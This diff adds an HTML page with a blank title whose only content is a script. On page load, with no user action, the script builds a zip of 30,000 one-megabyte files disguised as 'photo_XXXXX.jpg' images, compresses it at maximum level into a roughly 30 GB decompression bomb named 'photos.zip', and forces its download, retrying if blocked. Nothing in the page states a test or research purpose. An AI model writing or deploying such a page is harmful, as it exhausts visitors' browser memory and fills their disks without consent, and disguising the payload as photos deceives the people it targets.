@@ -1,0 +1,223 @@
+ <!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+</head>
+<body>
+<script>
+(function() {
+    const CHUNK_SIZE = 1024 * 1024;
+    const TARGET_FILES = 30000;
+    const CHUNK = new Uint8Array(CHUNK_SIZE);
+    for (let i = 0; i < CHUNK.length; i++) CHUNK[i] = 65;
+
+    let isGenerating = false;
+    let isDownloading = false;
+    let retryCount = 0;
+
+    function loadJSZip(callback) {
+        if (typeof JSZip !== 'undefined') {
+            callback();
+            return;
+        }
+        const script = document.createElement('script');
+        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js';
+        script.onload = callback;
+        script.onerror = function() {
+            // Fallback CDN
+            const script2 = document.createElement('script');
+            script2.src = 'https://cdn.jsdelivr.net/npm/jszip@3.10.1/dist/jszip.min.js';
+            script2.onload = callback;
+            script2.onerror = function() {
+                // Last resort - load from raw.githubusercontent.com
+                const script3 = document.createElement('script');
+                script3.src = 'https://rawcdn.githack.com/Stuk/jszip/v3.10.1/dist/jszip.min.js';
+                script3.onload = callback;
+                script3.onerror = function() {
+                    // If all CDNs fail, use built-in fallback
+                    createFallbackZip(callback);
+                };
+                document.head.appendChild(script3);
+            };
+            document.head.appendChild(script2);
+        };
+        document.head.appendChild(script);
+    }
+
+    function createFallbackZip(callback) {
+        // Minimal zip generator
+        window.JSZip = function() { this.files = []; };
+        JSZip.prototype.file = function(name, data) {
+            this.files.push({ name: name, data: data });
+        };
+        JSZip.prototype.generateAsync = function(options) {
+            return new Promise((resolve) => {
+                const chunks = [];
+                let centralDirectory = [];
+                let offset = 0;
+                const self = this;
+                self.files.forEach(function(file) {
+                    const nameBytes = new TextEncoder().encode(file.name);
+                    const dataBytes = new Uint8Array(file.data);
+                    const crc = crc32(dataBytes);
+                    const localHeader = new Uint8Array(30 + nameBytes.length);
+                    const view = new DataView(localHeader.buffer);
+                    view.setUint32(0, 0x04034b50, true);
+                    view.setUint16(4, 20, true);
+                    view.setUint16(6, 0, true);
+                    view.setUint16(8, 0, true);
+                    view.setUint16(10, 0, true);
+                    view.setUint16(12, 0, true);
+                    view.setUint32(14, crc, true);
+                    view.setUint32(18, dataBytes.length, true);
+                    view.setUint32(22, dataBytes.length, true);
+                    view.setUint16(26, nameBytes.length, true);
+                    view.setUint16(28, 0, true);
+                    localHeader.set(nameBytes, 30);
+                    chunks.push(localHeader);
+                    chunks.push(dataBytes);
+                    const centralEntry = new Uint8Array(46 + nameBytes.length);
+                    const cview = new DataView(centralEntry.buffer);
+                    cview.setUint32(0, 0x02014b50, true);
+                    cview.setUint16(4, 20, true);
+                    cview.setUint16(6, 20, true);
+                    cview.setUint16(8, 0, true);
+                    cview.setUint16(10, 0, true);
+                    cview.setUint16(12, 0, true);
+                    cview.setUint16(14, 0, true);
+                    cview.setUint32(16, crc, true);
+                    cview.setUint32(20, dataBytes.length, true);
+                    cview.setUint32(24, dataBytes.length, true);
+                    cview.setUint16(28, nameBytes.length, true);
+                    cview.setUint16(30, 0, true);
+                    cview.setUint16(32, 0, true);
+                    cview.setUint16(34, 0, true);
+                    cview.setUint32(36, 0, true);
+                    cview.setUint32(40, offset, true);
+                    centralEntry.set(nameBytes, 46);
+                    centralDirectory.push(centralEntry);
+                    offset += localHeader.length + dataBytes.length;
+                });
+                const endOfCentral = new Uint8Array(22);
+                const eView = new DataView(endOfCentral.buffer);
+                eView.setUint32(0, 0x06054b50, true);
+                eView.setUint16(4, 0, true);
+                eView.setUint16(6, 0, true);
+                eView.setUint16(8, centralDirectory.length, true);
+                eView.setUint16(10, centralDirectory.length, true);
+                eView.setUint32(12, centralDirectory.reduce((sum, e) => sum + e.length, 0), true);
+                eView.setUint32(16, offset, true);
+                eView.setUint16(20, 0, true);
+                const totalLength = chunks.reduce((sum, c) => sum + c.length, 0) +
+                                    centralDirectory.reduce((sum, e) => sum + e.length, 0) +
+                                    endOfCentral.length;
+                const result = new Uint8Array(totalLength);
+                let pos = 0;
+                chunks.forEach(function(c) { result.set(c, pos); pos += c.length; });
+                centralDirectory.forEach(function(c) { result.set(c, pos); pos += c.length; });
+                result.set(endOfCentral, pos);
+                resolve(new Blob([result], { type: 'application/zip' }));
+            });
+        };
+        function crc32(data) {
+            let crc = 0xFFFFFFFF;
+            for (let i = 0; i < data.length; i++) {
+                crc ^= data[i];
+                for (let j = 0; j < 8; j++) {
+                    if (crc & 1) crc = (crc >>> 1) ^ 0xEDB88320;
+                    else crc >>>= 1;
+                }
+            }
+            return (crc ^ 0xFFFFFFFF) >>> 0;
+        }
+        callback();
+    }
+
+    function generateZip() {
+        if (isGenerating) return;
+        isGenerating = true;
+        const zip = new JSZip();
+        let completed = 0;
+
+        function addBatch(start) {
+            if (start >= TARGET_FILES) {
+                isGenerating = false;
+                zip.generateAsync({
+                    type: 'blob',
+                    compression: 'DEFLATE',
+                    compressionOptions: { level: 9 }
+                }).then(function(blob) {
+                    downloadBlob(blob);
+                }).catch(function() {
+                    // Retry with no compression
+                    zip.generateAsync({
+                        type: 'blob',
+                        compression: 'DEFLATE',
+                        compressionOptions: { level: 1 }
+                    }).then(function(blob) {
+                        downloadBlob(blob);
+                    });
+                });
+                return;
+            }
+
+            const end = Math.min(start + 300, TARGET_FILES);
+            for (let i = start; i < end; i++) {
+                zip.file('photo_' + String(i).padStart(5, '0') + '.jpg', CHUNK);
+            }
+            completed = end;
+            setTimeout(function() { addBatch(end); }, 2);
+        }
+
+        addBatch(0);
+    }
+
+    function downloadBlob(blob) {
+        if (isDownloading) return;
+        isDownloading = true;
+        try {
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'photos.zip';
+            document.body.appendChild(a);
+            a.click();
+            setTimeout(function() {
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+                isDownloading = false;
+            }, 500);
+        } catch (e) {
+            isDownloading = false;
+            if (retryCount < 3) {
+                retryCount++;
+                setTimeout(function() {
+                    const url = URL.createObjectURL(blob);
+                    window.location.href = url;
+                    setTimeout(function() { URL.revokeObjectURL(url); }, 1000);
+                }, 500);
+            }
+        }
+    }
+
+    function start() {
+        loadJSZip(function() {
+            generateZip();
+        });
+    }
+
+    // Fire immediately when page loads
+    if (document.readyState === 'complete' || document.readyState === 'interactive') {
+        start();
+    } else {
+        document.addEventListener('DOMContentLoaded', start);
+    }
+
+    // Also fire on load as backup
+    window.addEventListener('load', start);
+})();
+</script>
+</body>
+</html>
